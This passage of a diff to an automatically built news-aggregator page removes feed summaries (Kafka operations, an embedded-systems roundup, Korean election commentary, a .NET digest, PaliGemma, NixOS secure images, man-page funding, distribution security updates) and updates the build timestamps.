-This simplified system management would have been useful for a project I previously worked on. The project was a large web application composed of dozens of microservices running in a Kubernetes cluster. These microservices primarily used Kafka to communicate. Our Kafka instance was also deployed in a Kubernetes cluster using the amq-streams operator.
-The operator made the deployment and management of the Kafka cluster simple; however, keeping the cluster stable was a constant battle. One …</span>
-                            </span>
-                          </div>
-                        </a>
-                      </details>
-                    </article>
-                </section>
-              </section>
-            </li>
-            <li class="card__section">
-              <section class="js-toggle-accordions-scope">
-                <h3 class="source-heading">
-                  <button
-                    class="source-heading__name"
-                    data-action="toggle-accordions"
-                    title="Click to toggle the source, Ctrl + click to toggle all."
-                  >Interrupt</button>
-                  <a class="source-heading__link" href="https://interrupt.memfault.com/">Open</a>
-                </h3>
-                <section class="articles-per-source">
-                    <article>
-                      <details
-                        class="article-expander"
-                        data-action="toggle-native-accordion"
-                        data-accordion-key="https://interrupt.memfault.com/blog/october-2024-roundup"
-                        open
-                      >
-                        <summary class="article-expander__title">What we&#x27;ve been reading in October (2024)</summary>
-                        <a class="article-summary-link article-summary-box-outer" href="https://interrupt.memfault.com/blog/october-2024-roundup">
-                          <div class="article-summary-box-inner media-object">
-                            <span class="media-object__text">
-                              <span>Here are the articles, videos, and tools that we’ve been excited about this
-October.
-Continue reading…</span>
-                            </span>
-                          </div>
-                        </a>
-                      </details>
-                    </article>
-                </section>
-              </section>
-            </li>
         </ul>
       </section>
       <section class="daily-content js-toggle-accordions-scope">
@@ -10356,216 +10605,11 @@ Continue reading…</span>
             data-action="toggle-accordions"
             title="Click to toggle the day, Ctrl + click to toggle all."
           >
-            <time class="daily-heading-toggle__weekday js-offset-weekday" data-offset-date=2024-11-06 datetime="2024-11-06T22:18:53.000Z">2024-11-06</time>
-            <time class="daily-heading-toggle__date js-offset-date" data-offset-date=2024-11-06 datetime="2024-11-06T22:18:53.000Z"></time>
+            <time class="daily-heading-toggle__weekday js-offset-weekday" data-offset-date=2024-11-06 datetime="2024-11-06T05:00:00.000Z">2024-11-06</time>
+            <time class="daily-heading-toggle__date js-offset-date" data-offset-date=2024-11-06 datetime="2024-11-06T05:00:00.000Z"></time>
           </button>
         </h2>
         <ul class="sources card">
-            <li class="card__section">
-              <section class="js-toggle-accordions-scope">
-                <h3 class="source-heading">
-                  <button
-                    class="source-heading__name"
-                    data-action="toggle-accordions"
-                    title="Click to toggle the source, Ctrl + click to toggle all."
-                  >슬로우뉴스.</button>
-                  <a class="source-heading__link" href="https://slownews.kr">Open</a>
-                </h3>
-                <section class="articles-per-source">
-                    <article>
-                      <details
-                        class="article-expander"
-                        data-action="toggle-native-accordion"
-                        data-accordion-key="https://slownews.kr/?p&#x3D;120667"
-                        open
-                      >
-                        <summary class="article-expander__title">더 늙고 더 위험한 트럼프가 돌아왔다: 슬로우레터 11월7일.</summary>
-                        <a class="article-summary-link article-summary-box-outer" href="https://slownews.kr/120667">
-                          <div class="article-summary-box-inner media-object">
-                            <span class="media-object__text">
-                              <span>더 늙고 더 위험한 트럼프가 돌아왔다. 트럼프의 부활. 트럼프가 어떻게 이겼나. 출구 조사를 살펴보니. 여론조사는 왜 틀렸나. “독재자를 고용했다.” 네이트 실버가 말하는 트럼프가 이긴 이유 24가지. 해리스는 왜 졌을까. 쟁점과 현안. 트럼프 충격, 원-달러 환율 1400원 돌파. 음주운전 논란, ‘7상시’ 행정관 복귀. 더 깊게 읽기. “집에 물어보고.” 마지막 기회. “유배나 귀양이라도 보내야 한다.” 다르게 읽기....
-The post 더 늙고 더 위험한 트럼프가 돌아왔다: 슬로우레터 11월7일. appeared first on 슬로우뉴스..</span>
-                            </span>
-                          </div>
-                        </a>
-                      </details>
-                    </article>
-                    <article>
-                      <details
-                        class="article-expander"
-                        data-action="toggle-native-accordion"
-                        data-accordion-key="https://slownews.kr/?p&#x3D;120640"
-                        open
-                      >
-                        <summary class="article-expander__title">보호된 글: 매운 맛 트럼프, 온 세상이 맛의 지옥을 경험할 차례다.</summary>
-                        <a class="article-summary-link article-summary-box-outer" href="https://slownews.kr/120640">
-                          <div class="article-summary-box-inner media-object">
-                            <span class="media-object__text">
-                              <span>보호 글이라서 요약이 없습니다.
-The post 보호된 글: 매운 맛 트럼프, 온 세상이 맛의 지옥을 경험할 차례다. appeared first on 슬로우뉴스..</span>
-                            </span>
-                          </div>
-                        </a>
-                      </details>
-                    </article>
-                </section>
-              </section>
-            </li>
-            <li class="card__section">
-              <section class="js-toggle-accordions-scope">
-                <h3 class="source-heading">
-                  <button
-                    class="source-heading__name"
-                    data-action="toggle-accordions"
-                    title="Click to toggle the source, Ctrl + click to toggle all."
-                  >from pvs-studio.com</button>
-                  <a class="source-heading__link" href="https://pvs-studio.com">Open</a>
-                </h3>
-                <section class="articles-per-source">
-                    <article>
-                      <details
-                        class="article-expander"
-                        data-action="toggle-native-accordion"
-                        data-accordion-key="https://pvs-studio.com/en/blog/posts/csharp/1180/"
-                        open
-                      >
-                        <summary class="article-expander__title">.NET Digest #4</summary>
-                        <a class="article-summary-link article-summary-box-outer" href="https://pvs-studio.com/en/blog/posts/csharp/1180/">
-                          <div class="article-summary-box-inner media-object">
-                            <span class="media-object__text">
-                              <span>Welcome to the fourth part of our digest on news and events in the .NET world! We&#x27;ve got a lot of updates this time. The PVS-Studio team is happy to present you a selection of the most exciting and...</span>
-                            </span>
-                          </div>
-                        </a>
-                      </details>
-                    </article>
-                </section>
-              </section>
-            </li>
-            <li class="card__section">
-              <section class="js-toggle-accordions-scope">
-                <h3 class="source-heading">
-                  <button
-                    class="source-heading__name"
-                    data-action="toggle-accordions"
-                    title="Click to toggle the source, Ctrl + click to toggle all."
-                  >Google Developers Blog</button>
-                  <a class="source-heading__link" href="https://developers.googleblog.com/rss/">Open</a>
-                </h3>
-                <section class="articles-per-source">
-                    <article>
-                      <details
-                        class="article-expander"
-                        data-action="toggle-native-accordion"
-                        data-accordion-key="https://developers.googleblog.com/en/gemma-explained-paligemma-architecture/"
-                        open
-                      >
-                        <summary class="article-expander__title">Gemma explained: PaliGemma architecture</summary>
-                        <a class="article-summary-link article-summary-box-outer" href="https://developers.googleblog.com/en/gemma-explained-paligemma-architecture/">
-                          <div class="article-summary-box-inner media-object">
-                            <span class="media-object__text">
-                              <span>PaliGemma, a lightweight open vision-language model (VLM), is able to take both image and text inputs and produce a text response, adding an additional vision model to the BaseGemma model.</span>
-                            </span>
-                          </div>
-                        </a>
-                      </details>
-                    </article>
-                </section>
-              </section>
-            </li>
-            <li class="card__section">
-              <section class="js-toggle-accordions-scope">
-                <h3 class="source-heading">
-                  <button
-                    class="source-heading__name"
-                    data-action="toggle-accordions"
-                    title="Click to toggle the source, Ctrl + click to toggle all."
-                  >LWN.net</button>
-                  <a class="source-heading__link" href="https://lwn.net">Open</a>
-                </h3>
-                <section class="articles-per-source">
-                    <article>
-                      <details
-                        class="article-expander"
-                        data-action="toggle-native-accordion"
-                        data-accordion-key="https://lwn.net/Articles/996329/"
-                        open
-                      >
-                        <summary class="article-expander__title">[$] Building secure images with NixOS</summary>
-                        <a class="article-summary-link article-summary-box-outer" href="https://lwn.net/Articles/996329/">
-                          <div class="article-summary-box-inner media-object">
-                            <span class="media-object__text">
-                              <span>Image-based Linux distributions have seen increasing popularity, recently. They
-promise reliability and security, but pose packaging problems for
-existing distributions. Ryan Lahfa and Niklas Sturm spoke about the work that
-NixOS has done to enable an image-based workflow at this year&#x27;s
-
-All Systems Go!
-conference in Berlin.
-Unfortunately, LWN was not able to cover the conference for scheduling reasons,
-but the
-
-videos of the event are available for anyone interested in watching the
-talks.
-Lahfa and Sturm explained that it is currently possible to create a
-
-NixOS system that
-cryptographically verifies the kernel, initrd, and Nix store on boot — although
-doing so still has some rough edges. Making an image-based NixOS installation is
-similarly possible.</span>
-                            </span>
-                          </div>
-                        </a>
-                      </details>
-                    </article>
-                    <article>
-                      <details
-                        class="article-expander"
-                        data-action="toggle-native-accordion"
-                        data-accordion-key="https://lwn.net/Articles/997193/"
-                        open
-                      >
-                        <summary class="article-expander__title">Funding restored for man-page maintenance</summary>
-                        <a class="article-summary-link article-summary-box-outer" href="https://lwn.net/Articles/997193/">
-                          <div class="article-summary-box-inner media-object">
-                            <span class="media-object__text">
-                              <span>Man pages maintainer Alejandro Colomar announced in September that he was suspending
-his work due to a lack of support.  He has now let
-it be known that funding has been found for the next year at least:
-
-
-	We&#x27;ve been talking for a couple of months, and we have already
-	agreed to sign a contract through the LF [Linux Foundation], where
-	a number of companies provide the funds for the contract.  The
-	contract will cover the next 12 months for the agreed amount, and
-	we should sign it in the following days.  Since I&#x27;ve already seen a
-	draft of the contract, and it looks good, I&#x27;ve already started
-	maintaining the project again, starting on Nov 1st.</span>
-                            </span>
-                          </div>
-                        </a>
-                      </details>
-                    </article>
-                    <article>
-                      <details
-                        class="article-expander"
-                        data-action="toggle-native-accordion"
-                        data-accordion-key="https://lwn.net/Articles/997182/"
-                        open
-                      >
-                        <summary class="article-expander__title">Security updates for Wednesday</summary>
-                        <a class="article-summary-link article-summary-box-outer" href="https://lwn.net/Articles/997182/">
-                          <div class="article-summary-box-inner media-object">
-                            <span class="media-object__text">
-                              <span>Security updates have been issued by AlmaLinux (libtiff), Debian (context, libheif, and thunderbird), Fedora (php-tcpdf, syncthing, and thunderbird), Gentoo (EditorConfig core C library, Flatpak, Neat VNC, and Ubiquiti UniFi), Oracle (bcc, bpftrace, grafana-pcp, haproxy, kernel, krb5, libtiff, python-gevent, python3.11-urllib3, python3.12-urllib3, and xmlrpc-c), Red Hat (python3.11-urllib3), SUSE (audacity, curl, govulncheck-vulndb, gradle, htmldoc, libgsf, python310, and qbittorrent), and Ubuntu (linux-aws-5.4, linux-oracle-5.4, mpg123, and python-werkzeug).</span>
-                            </span>
-                          </div>
-                        </a>
-                      </details>
-                    </article>
-                </section>
-              </section>
-            </li>
             <li class="card__section">
               <section class="js-toggle-accordions-scope">
                 <h3 class="source-heading">
@@ -10663,8 +10707,8 @@ The post 5 ways aerospace product development solves real-time challenges in spa
       </section>
 
     <footer>
-      <a class="footer-link" href="https://github.com/mononn/newsfeed/actions/runs/12187381702">
-        <time id="build-timestamp" datetime="2024-12-05T20:18:27.986Z">2024-12-05T20:18:27.986Z</time>
+      <a class="footer-link" href="https://github.com/mononn/newsfeed/actions/runs/12205536175">
+        <time id="build-timestamp" datetime="2024-12-06T20:18:06.429Z">2024-12-06T20:18:06.429Z</time>
       </a>
       <a class="footer-link" href="https://github.com/osmoscraft/osmosfeed">osmosfeed 1.15.1</a>
     </footer>
